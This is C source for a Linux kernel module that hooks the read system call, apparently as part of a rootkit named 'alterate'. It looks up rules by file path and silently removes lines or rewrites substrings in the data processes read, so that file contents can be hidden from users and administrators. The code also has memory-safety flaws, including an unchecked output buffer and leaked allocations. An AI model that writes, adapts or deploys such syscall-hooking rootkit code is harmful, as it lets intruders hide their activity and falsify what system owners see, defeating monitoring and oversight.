#include "alterate.h"

#include "alterate_api.h"
#include "ulist.h"

asmlinkage long (*__orig_read)(const struct pt_regs *) = NULL;

asmlinkage long notrace read_hook(const struct pt_regs *regs) {
    long ret = __orig_read(regs);
    if (ret <= 0)
        return ret;

    // Resolve fd absolute path
    int fd = regs->di;
    struct file *f = fget(fd);
    if (!f)
        return ret;
    struct path p = f->f_path;
    path_get(&p);
    char buf[512];
    char *fullpath = d_path(&p, buf, sizeof(buf));
    path_put(&p);
    fput(f);
    if (IS_ERR(fullpath))
        return ret;

    // Look up rule for this path
    struct ulist_item *it;
    char *rule_payload = NULL;

    spin_lock(&alt_list.lock);
    list_for_each_entry(it, &alt_list.head, list) {
        if (strcmp(fullpath, it->value) == 0) {
            rule_payload = it->payload;
            break;
        }
    }
    spin_unlock(&alt_list.lock);

    if (!rule_payload)
        return ret;

    // Parse payload = "line:substr:src:dst"
    char *dup = kstrdup(rule_payload, GFP_KERNEL);
    if (!dup)
        return ret;
    char *fld[4] = { NULL, NULL, NULL, NULL };
    int i;
    for (i = 0; i < 3; i++)
        fld[i] = strsep(&dup, ":");
    fld[3] = dup;

    int hide_line = simple_strtol(fld[0], NULL, 10);
    char *hide_substr = fld[1][0] ? fld[1] : NULL;
    char *src = fld[2][0] ? fld[2] : NULL;
    char *dst = fld[3][0] ? fld[3] : NULL;

    // Copy user buffer to kernel space
    char *kbuf = kmalloc(ret + 1, GFP_KERNEL);
    if (!kbuf)
        return ret;
    if (copy_from_user(kbuf, (char __user *)regs->si, ret)) {
        kfree(kbuf);
        return ret;
    }
    kbuf[ret] = '\0';

    // Allocate a new buffer for the modified content, times 2, no other idea for
    // the moment
    char *out = kmalloc(ret * 2 + 1, GFP_KERNEL);
    if (!out) {
        kfree(kbuf);
        return ret;
    }

    int line_no = 0;
    size_t out_len = 0;
    char *line;
    while ((line = strsep(&kbuf, "\n"))) {
        bool skip = false;
        line_no++;

        // Hide line by number
        if (hide_line > 0 && line_no == hide_line)
            skip = true;

        // Hide line by substring
        if (!skip && hide_substr && strstr(line, hide_substr))
            skip = true;

        // Replace substring
        if (!skip && src) {
            char *seg = line, *p2;
            while ((p2 = strstr(seg, src))) {
                // First part of the line
                size_t before = p2 - seg;
                memcpy(out + out_len, seg, before);
                out_len += before;

                // Replace substring
                memcpy(out + out_len, dst, strlen(dst));
                out_len += strlen(dst);
                seg = p2 + strlen(src);
            }

            // Copy the rest of the line
            strcpy(out + out_len, seg);
            out_len += strlen(seg);
            out[out_len++] = '\n';
            continue;
        }

        // Copy original line if not skipped
        if (!skip) {
            memcpy(out + out_len, line, strlen(line));
            out_len += strlen(line);
            out[out_len++] = '\n';
        }
    }
    out[out_len] = '\0';

    // Write back to user space
    if (!copy_to_user((char __user *)regs->si, out, out_len))
        ret = out_len;

    kfree(out);
    kfree(kbuf);
    return ret;
}